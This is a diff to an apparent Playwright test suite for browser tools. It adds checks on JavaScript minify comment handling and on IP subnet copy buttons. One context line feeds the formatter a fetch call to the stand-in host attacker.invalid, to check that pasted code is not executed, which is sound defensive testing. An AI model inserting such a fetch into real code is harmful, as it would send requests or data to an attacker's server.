@@ -53,6 +53,18 @@ def run_source_formatter_desktop(page, report: dict, _inventory) -> None:
     expect(page.locator("[data-javascript-formatter] [data-output]")).to_have_value(
         re.compile(r"const add=")
     )
+    page.locator("[data-javascript-formatter] [data-input]").fill(
+        "/*! license */\n// ordinary note\nconst value = 1;"
+    )
+    expect(page.locator("[data-javascript-formatter] [data-output]")).to_have_value(
+        re.compile(r"license")
+    )
+    if "ordinary note" in page.locator(
+        "[data-javascript-formatter] [data-output]"
+    ).input_value():
+        report["ui_detail_failures"].append(
+            "JavaScript minify preserved ordinary comments without opt-in."
+        )
     page.evaluate("globalThis.__plainToolAttack = 0")
     page.locator("[data-javascript-formatter] [data-input]").fill(
         'globalThis.__plainToolAttack=3;fetch("https://attacker.invalid/javascript")'
@@ -132,6 +144,23 @@ def run_ip_subnet_desktop(page, report: dict, _inventory) -> None:
     state = page.evaluate("""() => ({ first: document.querySelector('[data-result="firstUsableAddress"]').textContent, last: document.querySelector('[data-result="lastUsableAddress"]').textContent, usable: document.querySelector('[data-result="usableAddresses"]').textContent })""")
     if state != {"first": "198.51.100.10", "last": "198.51.100.11", "usable": "2"}:
         report["ui_detail_failures"].append(f"IPv4 /31 semantics failed: {state}")
+
+    row_copy_buttons = page.locator("[data-ip-subnet] [data-copy-result]")
+    report["ip_subnet_row_copy_count"] = row_copy_buttons.count()
+    page.evaluate(
+        """() => {
+          Object.defineProperty(navigator, 'clipboard', {
+            configurable: true,
+            value: { writeText: (value) => { window.__ipSubnetCopied = value; return Promise.resolve(); } },
+          });
+        }"""
+    )
+    page.locator('[data-copy-result="cidr"]').click()
+    page.wait_for_function("window.__ipSubnetCopied === '198.51.100.10/31'")
+    if report["ip_subnet_row_copy_count"] != 10:
+        report["ui_detail_failures"].append(
+            f"IPv4 result rows do not all expose copy actions: {report['ip_subnet_row_copy_count']}"
+        )
 
     page.evaluate(
         """value => {
